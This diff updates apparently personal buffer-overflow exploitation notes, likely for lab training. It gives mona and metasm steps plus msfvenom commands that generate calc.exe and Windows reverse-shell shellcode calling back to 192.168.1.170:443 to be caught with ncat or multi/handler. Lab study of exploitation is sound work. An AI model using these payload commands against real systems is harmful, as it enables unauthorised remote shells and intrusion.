@@ -19,18 +19,16 @@ Look for jump esp instruction excluding badchars
 !mona jmp -r esp -cpb "\x00\x0A"
 
 #step 7, pop calc.exe
+msfvenom -p windows/exec -b \x00\x0A -f python --var-name shellcode_calc CMD=calc.exe EXITFUNC=thread
 
-#step 8, generate shell code
+#step 8, instead of using NOPs, do this the right way. drag ESP far enough to not be affected. Only takes 3 bytes. 
+metasm > sub esp,0x10
+
+#step 9, generate shell code
 #msfvenom -p windows/shell/reverse_tcp LPORT=1337 LHOST=10.11.0.X -b '\x00' -f ruby
 #remember to insert the bad characters in the -b section
 # TAKE NOTE OF HOW BIG YOUR SHELL CODE IS
+#Python generation without a stage can be caught by ncat and does not crash the program because of exit function
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.170 LPORT=443 -b \x00\x0A -f python --var-name shellcode EXITFUNC=thread
 
-#step 9, generate space with metasm that is a little biggrt than the unpacked space of your shell code.
-#not a bad idea to make it the same size as the unpacked code too
-#add esp, -1650 was good in this instance
-# DO NOT FLIP THIS ADDRESS!
-#If you get stackoverflow errors, take the space out and put a bunch of \x90 or TESTSTRINGS in to pad.
-
-#step 10, pack in the shell code generated above
-
-#step 11, make sure to catch with a multi/handler in msfconsole
+#step 10, make sure to catch with a multi/handler in msfconsole or ncat if using stageless payload
